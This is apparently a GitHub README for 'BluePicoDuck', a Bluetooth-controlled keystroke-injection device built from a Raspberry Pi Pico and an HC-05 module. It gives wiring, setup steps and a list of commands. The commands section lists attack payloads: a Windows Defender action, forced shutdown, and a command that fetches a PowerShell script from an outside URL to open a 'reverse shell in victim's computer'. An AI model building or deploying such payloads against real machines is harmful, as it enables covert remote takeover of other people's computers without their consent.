## About

This is a device which emulate keyboard and keyboard strokes. Because windows and other operating system consider these rubber duckys as keyboard and not storage device.
So, in that case windows trust rubber duck and keyboard. No privilage were added to rubber rucky. But speed matter's. Because a human can type in normal speed but rubber ducky will type 5x time faster than human. So time matter's.

We can do by using ducky scripts created by hack5. They are the founder of rubber ducky. and special thanks to them to be a inspiration for creating this project.
Let's Start to create your own BluePicoDuck.

## Hardware

This tool requires following hardware:  
* Raspberry Pi pico.
* Hc-05

That's it now let's go to step up raspbery pico and solder or make wiring in it.

## FLASHING

Install adafruit circuit python in raspberry pi pico:

 ## Tutorial for installing circuit python in Raspberry Pi Pico.
 
 * First insert raspberry pi pico by pressing the white buton on the top.
 * Now, copy and paste the circuitpython file we downloaded .utf2 into raspberry pi pico.
 * Now it automatically disconnects and connect as partition circuit python.

Thats it we installed Circuit Python in Raspberry pi pico. We can to next Step

## Wiring Part

PCB Layout:

<img src="https://github.com/Pr0fe5s0r/BluePicoDuck/blob/main/images/7.png">

This is the Schematic of HC-05 and raspberry pi pico.

## Connection:
* HC05 --------- RASPBERRY PI PICO
* VCC  --------- 5V(VBUS)
* GND  --------- GND
* RXD  --------- GPO1
* TXD  --------- GP02

## Coding Part:

There's a zip file called <h4><a href="https://github.com/Pr0fe5s0r/BluePicoDuck/blob/main/BluCode.zip">BlueCode</a></h4>

Extract it in a folder and copy them and paste it in Raspberry pi pico.

Thats it we are now ready to Go nxt!!

## Android App:

There zip file called <h4><a href="https://github.com/Pr0fe5s0r/BluePicoDuck/blob/main/app.zip">app</a></h4>

extract it and build with android studio. I will add tutorial videos at end for building android project.

* Build it and install it into android phone. ## (IF ANY ERROR OCCURS PLEASE ADD IT IN ISSUE TAB)
* Now open the and check it's all ok.

## Thats it. Final!!!!!!

Now Set uped everything lets test i programmed it based on passing arguments in it. 

Command's:

* (arg) D - wallpaper change
* D - rubber ducky wallpaper change
* A - Rick and roll
* W - windows Defender
* B - Shut Down the computer

* (arg) O - Open Notepad
* (arg) C - Type command on same line
* (arg) E C - Type command in new line

* (arg) R - Reverse shell with link. 

There are some buttons will show when you are conected to the device.

In the top button there is a text boxt with button send command. In that we pass arguments and values for example

* Hello bro O -------- Create a note pad and type Hello Bro
* Hello Bro E C -------- Create new line and type hello bro
* hello C ----------- simply type hello bro
* http://reverse-shell.com/reverseshell.ps1 R ------------- Create reverse shell in victim's computer.
* http://wallpaper.com/wallpaper.jpg D ------------ change wallpaper

Like that we can create our own payload in python in efficient way.

In future releases i will make it more simple.
